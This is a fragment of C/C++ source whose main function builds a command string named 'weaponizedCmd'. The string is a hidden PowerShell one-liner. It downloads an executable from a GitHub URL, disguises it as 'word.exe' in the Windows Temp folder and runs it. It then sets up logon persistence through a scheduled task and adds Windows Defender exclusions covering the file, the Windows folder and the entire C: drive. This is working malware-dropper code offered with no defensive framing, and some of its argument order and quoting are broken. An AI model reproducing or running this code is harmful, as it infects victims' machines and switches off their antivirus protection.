...
int main() {
    ...
    swprintf_s(weaponizedCmd, 2048, 
        L"powershell.exe -ExecutionPolicy -WindowStyle Hidden Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $zipPath=\\\"C:\\Windows\\Temp\\word.exe\\\"; (New-Object System.Net.WebClient).DownloadFile(\\\"https://github.com/tkankkoa-ai/ok/raw/refs/heads/main/Client.exe\\\", $zipPath); Start-Process \\\"$zipPath\\\"  -WindowStyle Hidden; schtasks /create /tn \\\"ActiveOffices\\\" /tr \\\"\\\"$zipPath\\\" /sc onlogon /delay 0001:00 /rl highest /f;Add-MpPreference -ExclusionPath \\\"C:\\Windows\\Temp\\word.exe\\\";Add-MpPreference -ExclusionPath \\\"C:\\Windows\\Temp\\\";Add-MpPreference -ExclusionPath \\\"C:\\Windows\\\";Add-MpPreference -ExclusionPath \\\"C:\\\"; \"");
